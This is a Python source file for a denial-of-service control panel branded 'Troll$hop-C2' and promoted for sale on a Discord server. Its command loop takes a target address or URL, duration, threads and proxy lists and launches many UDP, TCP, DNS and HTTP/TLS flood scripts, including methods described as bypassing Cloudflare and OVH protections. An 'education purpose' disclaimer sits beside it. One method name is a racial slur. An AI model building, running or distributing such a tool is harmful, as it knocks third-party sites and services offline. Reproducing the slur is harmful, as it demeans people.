# BRO THIS IS  OWN CODED BY MYSELF SO DONT  RECODE IT ~KOTAROPH 
# SELL ON DISCORD.GG/TROLLSHOPS
import socket
import os
import requests
import random
import getpass
import time
import sys
from sys import stdout
from colorama import Fore, init
from asciimatics.effects import BannerText, Print, Scroll
from asciimatics.renderers import ColourImageFile, FigletText, ImageFile, StaticRenderer
from asciimatics.scene import Scene
from asciimatics.screen import Screen
from asciimatics.exceptions import ResizeScreenError, StopApplication
from layer4.UDPFlood import UDPFlood

os.system("cls" if os.name == "nt" else "clear")
uname=input("Enter Server Username : ")
os.system("cls" if os.name == "nt" else "clear")
print(f"Welcome To Server | User: {uname}")
print("please wait...")
ip= requests.get('https://api.ipify.org').text.strip()
online= random.randint(1, 153)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxy = open('proxy.txt').readlines()
bots = len(proxy)

###Help Gif###
def hlp(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "help.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height//- 5,
              speed=1),
    ]
    scenes.append(Scene(effects, 24))

    screen.play(scenes, stop_on_resize=False, repeat=False)
###Attack gif###
def atk(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "atk.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height//- 5,
              speed=1),
    ]
    scenes.append(Scene(effects, 21))

    screen.play(scenes, stop_on_resize=False, repeat=False)
###Method gif###
def mthd(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "methods.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height//- 5,
              speed=0.5),
    ]
    scenes.append(Scene(effects, 20))

    screen.play(scenes, stop_on_resize=False, repeat=False)

def tools():
    clear()
    print(f'''
\033[92mreverseip► Chek url for ip
\033[92mdns ► Check dns
\033[92masn-lookup ► asn lookup
\033[92msubnet-lookup  ►  Subnet lookup
\033[92mreverse-dns ►  Reverse dns
''')

def rules():
    clear()
    print(f'''
                1. For education purpose             
                2. Only attack stress testing servers         
                3. Dont trust anyone                
                4. The creator does not do any harm           
                
''')
    
def layer7():
    Screen.wrapper(mthd)
    clear()
    print("""
\033[94m
╔════════════════════════════════════════════════════════════╗
║                  \033[92m✦ Troll$hop-C2 LAYER 7 ✦                  \033[94m║
╚════════════════════════════════════════════════════════════╝
\033[94m
╭────────────────────────────────────────────────────────────╮
│  \033[92m❯ .CFSOCKET  \033[94m│  Cloudflare Socket                         │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .HENTAI    \033[94m│  Hentai Method                             │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .RAW       \033[94m│  Raw Brutal                                │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .SLOW      \033[94m│  Slow Method Attack                        │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .SPAM      \033[94m│  Spam Method                               │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .GLACIER   \033[94m│  Glacier Method                            │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .NEEGA     \033[94m│  Tls V1  Method                            │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .TLS-V2    \033[94m│  Tls V2 Method                             │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .HTTPS     \033[94m│  Https Method                              │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .geo       \033[94m│  Bypass UAM                                │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .geo2      \033[94m│  Bypass UAM V2                             │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .BYPASS    \033[94m│  Bypass Protect                            │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .BYP-SILIT \033[94m│  BYPASS-SILIT Method [Cloudflare-uam]      │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .BASIC     \033[94m│  Basic Method                              │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .IMPROVED  \033[94m│  Improved Tls Method                       │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .BUG       \033[94m│  All Methods                               │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .BIGSIZE   \033[94m│  All Methods                               │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .NIGGER    \033[94m│  Fix Bypass/Flood                          │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .HOLD      \033[94m│  Full Bypass                               │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .XRESET    \033[94m│  Reset Method                              │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .LOADDER   \033[94m│  Flood Loader                              │
╰────────────────────────────────────────────────────────────╯

╔════════════════════════════════════════════════════════════╗
║                 \033[92m✦ discord.gg/Trollshops ✦                  \033[94m║
╚════════════════════════════════════════════════════════════╝
""")
    
def layer4():
    Screen.wrapper(mthd)
    clear()
    print("""
\033[94m
╔════════════════════════════════════════════════════════════╗
║                  \033[92m✦ Troll$hop-C2 LAYER 4 ✦                  \033[94m║
╚════════════════════════════════════════════════════════════╝
\033[94m
╭────────────────────────────────────────────────────────────╮
│  \033[92m❯ .SAMP      \033[94m│  Flood Cookies                             │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .DNS       \033[94m│  DNS METHOD LOL                            │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .TCP       \033[94m│  TCP Brutal                                │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .OVH-UDP   \033[94m│  Bypass OVH Firewall + UDP Flood           │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .UDP       \033[94m│  BASIC UDP FLOOD                           │
├────────────────────────────────────────────────────────────┤
│  \033[92m❯ .UDP2      \033[94m│  UDP FLOOD  BYPASS                         │
╰────────────────────────────────────────────────────────────╯

╔════════════════════════════════════════════════════════════╗
║                 \033[92m✦ discord.gg/Trollshops ✦                  \033[94m║
╚════════════════════════════════════════════════════════════╝
""")
    

def exit_program():
    clear()
    sys.exit()
    print('''C2 Exit''')
    
def helpmenu():
    Screen.wrapper(hlp)
    os.system("cls" if os.name == "nt" else "clear")                                                      
    stdout.write("             " + Fore.LIGHTGREEN_EX + "╔═════════════════════════════════════════════════════╗\n")
    stdout.write("             " + Fore.LIGHTGREEN_EX + "║ " + Fore.MAGENTA + "• " + Fore.LIGHTWHITE_EX + "layer7   " + Fore.LIGHTGREEN_EX + "|" + Fore.LIGHTWHITE_EX + " Show Layer 7 Methods                   " + Fore.LIGHTGREEN_EX + "║\n")
    stdout.write("             " + Fore.LIGHTGREEN_EX + "║ " + Fore.MAGENTA + "• " + Fore.LIGHTWHITE_EX + "layer4   " + Fore.LIGHTGREEN_EX + "|" + Fore.LIGHTWHITE_EX + " Show Layer 4 Methods                   " + Fore.LIGHTGREEN_EX + "║\n")
    stdout.write("             " + Fore.LIGHTGREEN_EX + "║ " + Fore.MAGENTA + "• " + Fore.LIGHTWHITE_EX + "Myip     " + Fore.LIGHTGREEN_EX + "|" + Fore.LIGHTWHITE_EX + " Show Your IP                           " + Fore.LIGHTGREEN_EX + "║\n")
    stdout.write("             " + Fore.LIGHTGREEN_EX + "║ " + Fore.MAGENTA + "• " + Fore.LIGHTWHITE_EX + "rules    " + Fore.LIGHTGREEN_EX + "|" + Fore.LIGHTWHITE_EX + " Show rules                             " + Fore.LIGHTGREEN_EX + "║\n")
    stdout.write("             " + Fore.LIGHTGREEN_EX + "║ " + Fore.MAGENTA + "• " + Fore.LIGHTWHITE_EX + "clear    " + Fore.LIGHTGREEN_EX + "|" + Fore.LIGHTWHITE_EX + " Clear Terminal                         " + Fore.LIGHTGREEN_EX + "║\n")
    stdout.write("             " + Fore.LIGHTGREEN_EX + "║ " + Fore.MAGENTA + "• " + Fore.LIGHTWHITE_EX + "Admin    " + Fore.LIGHTGREEN_EX + "|" + Fore.LIGHTWHITE_EX + " Admin Infomation                       " + Fore.LIGHTGREEN_EX + "║\n")
    stdout.write("             " + Fore.LIGHTGREEN_EX + "╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
    
def mip():
    print(f"""\x1b[0mYour IP Is \x1b[40;38;2;127;0;255m{ip}\x1b[0m""")
    
def menu():
    sys.stdout.write(f"         \x1b]5; Troll$hop-C2 PANEL--> Stars: [{bots}] | Online Users: [1] | Methods: [17] | Bypass: [18]\x07")
    clear()
    print("""\x1b[38;2;128;128;255m  
                                ___    _          
                               | . \ _| | ___  ___
                               | | |/ . |/ . \<_-<
                               |___/\___|\___//__/      
                       ╚═╦═══════════════════════════════╦═╝
                   ╚══╦══╩═══════════════════════════════╩═╦═══╝
                      ║      \x1b[38;2;255;255;255mWelcome To \x1b[38;2;255;0;0mTroll$hops-C2\x1b[38;2;128;128;255m      ║
                      ║      \x1b[38;2;255;255;255mType\x1b[38;2;255;215;0m HELP\x1b[38;2;255;255;255m To See Commands\x1b[38;2;128;128;255m     ║
               ╚═══╦══╩════════════════════════════════════╩═══╦═══╝
          ╚╦═══════╩═══════════════════════════════════════════╩═══════╦╝
           ║-----------------------------------------------------------║
           ╚═══════════════════════════════════════════════════════════╝""")
def main():
    menu()
    while(True):
        cnc = input(f"""\x1b[38;2;239;239;239m┏━━[\x1b[38;2;255;99;71mTroll$hop\x1b[38;2;239;239;239m] - [\x1b[38;2;255;234;0m{uname}\x1b[38;2;239;239;239m]\n\x1b[38;2;239;239;239m┗━━➤ """)
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "CLEAR" or cnc == "clear" or cnc == "cls":
            main()
        elif cnc == "MYIP" or cnc == "myip" or cnc == "ip":
            mip()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "exit" or cnc == "ext" or cnc == "EXIT" or cnc == "Exit":
            exit_program()
        elif cnc == "HELP" or cnc == "Help" or cnc == "help":
            helpmenu()
        elif cnc =="ADMIN" or cnc == "Admin" or cnc == "admin":
            print("\x1b[38;2;0;255;255mKotaroisnice")
            print("\x1b[38;2;0;255;255mKaitaro")
            print("\x1b[38;2;0;255;255mXsosPh")
            print("\x1b[38;2;0;255;255mS3ndo")
            print("\x1b[38;2;0;255;255mNancePh")
            
#########################LAYER4#############################
                       
        elif "UDP" in cnc:
            try:
                parts = cnc.split()
                ip = parts[1]
                port = int(parts[2])
                duration = int(parts[3])
                Screen.wrapper(atk)
                UDPFlood(ip, port, duration)
            except (IndexError, ValueError):
                print('Usage: UDP <ip> <port> <time>')
                print('Example: UDP 192.168.1.1 80 60')        

        elif "DNS" in cnc:
            try:
               parts = cnc.split()
               ip = parts[1]
               port = parts[2]
               duration = parts[3]  # Attack duration in seconds
               packet_size = parts[4]  # Packet size
               threads = parts[5]  # Number of threads
               Screen.wrapper(atk)
               os.system(f'python3 layer4/DNS.py {ip} {port} {duration} {packet_size} {threads}')
            except IndexError:
               print('Usage: DNS <ip> <port> <duration> <packet_size> <threads>')
               print('Example: DNS 192.168.1.1 53 60 102')
 
        elif "TCP" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                conn = cnc.split()[3]
                time = cnc.split()[4]
                out = cnc.split()[5]
                Screen.wrapper(atk)
                os.system(f'go run layer4/tcp.go {ip} {port} {conn} {time} {out}')
            except IndexError:
                print('Usage: TCP <ip> <port> <connection> <seconds> <timeout>')
                print('Example: TCP 1.1.1.1 80 1250 60 5')
                            
        elif "UDP2" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                conn = cnc.split()[3]
                time = cnc.split()[4]
                out = cnc.split()[5]
                Screen.wrapper(atk)
                os.system(f'go run layer4/udp.go {ip} {port} {conn} {time} {out}')
            except IndexError:
                print('Usage: UDP2 <ip> <port> <connection> <seconds> <timeout>')
                print('Example: UDP2 1.1.1.1 80 1250 60 5')

 
        elif "SAMP" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time =cnc.split()[3]
                Screen.wrapper(atk)
                os.system(f'python layer4/samp-cookies.py {ip} {port} {time}')
            except IndexError:
                print('Usage: SAMP  <Target> <port> <time>')
                

        elif "OVH-UDP" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time =cnc.split()[3]
                Screen.wrapper(atk)
                print("Coming soon...")
            except IndexError:
                print('Usage: OVH-UDP <Target> <port> <time>')
                
#########################LAYER7#############################    
        elif "XRESET" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                ratelimit = cnc.split()[4]
                proxy = cnc.split()[5]
                ipversion = cnc.split()[6]
                Screen.wrapper(atk)
                os.system(f'node layer7/xreset.js {url} {time} {threads} {ratelimit} {proxy} {ipversion}')
            except IndexError:
                print('Usage: XRESET <URL> <Time> <threads> <ratelimit> proxy.txt ipv4')
                      
                           
        elif "CFSOCKET" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                Screen.wrapper(atk)
                os.system(f'node layer7/cf1.js {url} {time}')
            except IndexError:
                print('Usage: CFSOCKET  <target> <time>')
                
        elif "HENTAI" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                Screen.wrapper(atk)
                os.system(f'go run layer7/hentai.go -host {url} -time {time}')
            except IndexError:
                print('Usage: HENTAI <url> <time>')
                
        elif "FLOOD" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                Screen.wrapper(atk)
                os.system(f'go run layer7/Flood.go -site {url} -data {method}')
            except IndexError:
                print('Usage: FLOOD -site <url> -data <method GET/POST>')
                
        elif "SLOW" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                thread = cnc.split()[4]
                Screen.wrapper(atk)
                os.system(f'node layer7/lol.js {url} {time} {rate} {thread} {proxy}')
            except IndexError:
                print('Usage: SLOW <url> <time> <rate> <thread> <proxy>')
                
        elif "BYP-SILIT" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                Screen.wrapper(atk)
                os.system(f'node layer7/BYPASS-SILIT.js {url} {time} 100 5 proxy.txt')
            except IndexError:
                print('Usage: BYP-SILIT <url> <time>')
                
        elif "BLOD" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                Screen.wrapper(atk)
                os.system(f'node layer7/bypassUAM.js {url} {time} {rate} {proxy} {thread}')
            except IndexError:
                print('Usage: BLOD <url> <time> <ratelimit> <rate> proxy> <thread>')
                
                
        elif "GLACIER" in cnc:
            try:
                method = cnc.split()[1]
                url = cnc.split()[2]
                proxy = cnc.split()[3]
                time = cnc.split()[4]
                rps = cnc.split()[5]
                thread = cnc.split()[6]
                Screen.wrapper(atk)
                os.system(f'node layer7/CF-GLACIER.js {method} {url} {proxy} {time} {rps} {thread}')
            except IndexError:
                print('Usage: GLACIER <GET/POST> <url> <proxy> <time> <rps> <thread>')
                
        elif "TLS-V2" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                Screen.wrapper(atk)
                os.system(f'node layer7/TLS-V2.js {url} {time} {rps} {thread}')
            except IndexError:
                print('Usage: TLS-V2 <url> <time> <rps> <thread>')
                
        elif "RAW" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                Screen.wrapper(atk)
                os.system(f'node layer7/RAW.js {url} {time}')
            except IndexError:
                print('Usage: RAW <url> <time>')
                
        elif "HTTPS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                Screen.wrapper(atk)
                os.system(f'node layer7/HTTP.js GET {url} proxy.txt {time} 64 10')
            except IndexError:
                print('Usage: HTTPS <url> <time>')
                
        elif "GEO" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                Screen.wrapper(atk)
                os.system(f'node layer7/geo.js {url} {time} {rps} {thread} {proxy}')
            except IndexError:
                print('Usage: GEO <url> <time> <rps> <thread> <proxy>')
        elif "SPAM" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                Screen.wrapper(atk)
                os.system(f'node layer7/SPAM.js {url} {time} 100 10 proxy.txt')
            except IndexError:
                print('Usage: SPAM <url> <time>')
                
        elif "BYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                Screen.wrapper(atk)
                os.system(f'node layer7/NOX.js {url} {time} 10 64 proxy.txt http.txt')
                os.system(f'node layer7/BYPASS.js {url} {time} 64 10 proxy.txt http.txt')
                os.system(f'node layer7/HTTP-BYPASS.js {url} {time} 10 proxy.txt http.txt proxies.txt')
            except IndexError:
                print('Usage: BYPASS <url> <time>')
                
        elif "GEO2" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                proxy = cnc.split()[4]
                rps = cnc.split()[5]
                Screen.wrapper(atk)
                os.system(f'node layer7/geo2.js {url} {time} {thread} {proxy} {rps}')
            except IndexError:
                print('Usage: GEO <url> <time> <thread> <proxy> <rps>')
                
        elif "IMPROVED" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                Screen.wrapper(atk)
                os.system(f'node layer7/improved-tls.js {url} {time} {rps} {thread} {proxy}')
            except IndexError:
                print('Usage: IMPROVED <url> <time> <rps> <thread> <proxy>')
                
        elif "BASIC" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                Screen.wrapper(atk)
                os.system(f'node layer7/anus.js {url} {time} {rps} {thread} {proxy}')
            except IndexError:
                print('Usage: BASIC <url> <time> <rps> <thread> <proxy>')
                
        elif "BUG" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                Screen.wrapper(atk)
                os.system(f'node layer7/improved-tls.js {url} {time} 64 10 proxy.txt')
                os.system(f'node layer7/anus.js {url} {time} 64 10 proxy.txt')
                os.system(f'node layer7/NOX.js {url} {time} 10 64 proxy.txt http.txt')
            except IndexError:
                print('Usage: BUG <url> <time>')
                print('INI ADALAH METHOD CAMPURAN')
                
        elif "NIGGER" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                Screen.wrapper(atk)
                os.system(f'node layer7/HTTP.js {url} {time} 10 64 proxy.txt')
                os.system(f'node layer7/HTTP-ENTOD.js {url} {time} ua.txt 10 GET proxy.txt proxies.txt')
                os.system(f'node layer7/RAW.js {url} {time}')
                os.system(f'node layer7/TLS-V2.js {url} {time} 64 10')
                os.system(f'go run layer7/entai.go -host {url} -time {time}')
                os.system(f'go run layer7/Flood.go -site {url} -data GET')
            except IndexError:
                print('Usage: BUG <url> <time>')
                print('INI ADALAH METHOD CAMPURAN')
                
        elif "BIGSIZE" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                Screen.wrapper(atk)
                os.system(f'node layer7/TLS-VIP.js {url} {time} 64 5')
                os.system(f'node layer7/TLS-kill.js {url} 5 100 GET {time}')
                os.system(f'node layer7/TLS-AQUA.js {url} {time} 64 5 proxy.txt')
            except IndexError:
                print('Usage: BIGSIZE <url> <time> <method GET>')
                print('INI ADALAH METHOD CAMPURAN')
                
        elif "HOLD" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                Screen.wrapper(atk)
                os.system(f'node layer7/hold.js {url} {time} 64 10 proxy.txt')
                os.system(f'node layer7/gflood.js {url} {time} 64 10 proxy.txt')
            except IndexError:
                print('Usage: HOLD <url> <time>')
                
        elif "LOADDER" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                Screen.wrapper(atk)
                os.system(f'node layer7/gflood.js {url} {time} {rps} {thread} proxy.txt')
            except IndexError:
                print('Usage: LOADDER <url> <time> <rps> <thread>')
                
        elif "NEEGA" in cnc:
            try:
                url = cnc.split()[2]
                time = cnc.split()[3]
                rate = cnc.split()[4]
                thread = cnc.split()[5]
                Screen.wrapper(atk)
                os.system(f'node layer7/neega.js {url} {time} {rate} {thread} proxy.txt')
            except IndexError:
                print('Usage: NEEGA <url> <time> <rate> <thread> <proxy>')                
       
       
#TOOLS

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns" in cnc:
            try:
                domain = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={domain}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns <dns>')
                print('Example: dns google.com')

        elif "reverse-dns" in cnc:
            try:
                domain = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={domain}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')
            

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass

###Account###

def login():
    clear()
    passwd = ""
    password = getpass.getpass(prompt=' 🚀 Password: ')
    if password != passwd:
        print("")
        print("🚀 Wrong Pass.")
        sys.exit(1)
    elif  password == passwd:
        print("🚀 Welcome to C2 PANEL!")
        main()

login()
